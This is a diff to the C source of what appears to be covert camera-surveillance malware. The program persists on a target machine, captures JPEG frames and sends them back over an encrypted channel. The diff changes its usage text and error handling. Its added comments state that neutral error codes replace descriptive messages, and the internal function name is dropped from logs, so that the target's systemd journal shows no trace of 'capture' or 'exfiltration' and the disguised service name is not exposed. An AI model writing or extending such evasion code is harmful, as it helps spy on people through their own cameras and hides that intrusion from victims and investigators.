@@ -72,9 +72,9 @@ static void usage(const char *argv0)
         "  --no-persist        不执行驻留（仅调试；部署时禁止）\n"
         "  --root PREFIX       驻留假根（仅测试用， NULL = 真实根）\n"
         "\n"
-        "采集:\n"
+        "SOURCE:\n"
         "  --width N --height N --fps N\n"
-        "  --capture-ms N      单次采集窗口，到点释放设备句柄\n"
+        "  --capture-ms N      单次窗口，到点释放句柄\n"
         "  --frames N          每批帧数\n"
         "  --quality N         JPEG 质量 1..100\n"
         "\n"
@@ -229,7 +229,7 @@ int main(int argc, char **argv)
         fprintf(stderr,
                 "[FATAL] --key 的前 16 字节与后 16 字节相同。\n"
                 "        前 16 字节是 k_send，后 16 字节是 k_recv，二者必须不同\n"
-                "        （方向分离）。相同会让回传通道初始化失败（-4），而该\n"
+                "        （方向分离）。相同会让通道初始化失败（-4），而该\n"
                 "        错误码看不出成因。请用 32 字节随机密钥，例如：\n"
                 "          od -An -tx1 -N32 /dev/urandom | tr -d ' \\n'\n");
         return 2;
@@ -258,12 +258,18 @@ int main(int argc, char **argv)
     if (rc != 0) {
         /* 返回值语义见 cam_daemon.h：
          *   -1 参数非法 / -2 驻留失败 / -3 采集源创建失败 / -4 回传通道初始化失败 */
+        /* why 用中性分类码，不写中文语义：stderr 在 systemd 下进 journal，
+         * 一条 journalctl 就会把"采集""回传"这类词留在目标机日志里。
+         * 退出码与分类码的对照见离线文档。 */
         const char *why =
-            rc == -1 ? "参数非法" :
-            rc == -2 ? "驻留失败" :
-            rc == -3 ? "采集源创建失败（backend 未链入或无可访问设备）" :
-            rc == -4 ? "回传通道初始化失败" : "未知错误";
-        fprintf(stderr, "[FATAL] cam_daemon_run 返回 %d（%s）\n", rc, why);
+            rc == -1 ? "E_ARGS" :
+            rc == -2 ? "E_PERSIST" :
+            rc == -3 ? "E_SOURCE" :
+            rc == -4 ? "E_CHANNEL" : "E_UNKNOWN";
+        /* 日志不得出现内部函数名：stderr 在 systemd 下进 journal，
+         * journalctl -u <伪装服务名> 一查就会读到 cam_daemon_run，
+         * 落点名伪装得再好也会被这一行捅破。 */
+        fprintf(stderr, "[FATAL] 运行失败: code=%d（%s）\n", rc, why);
         return (rc == -2) ? 3 : (rc == -3) ? 4 : (rc == -4) ? 5 : 2;
     }
 
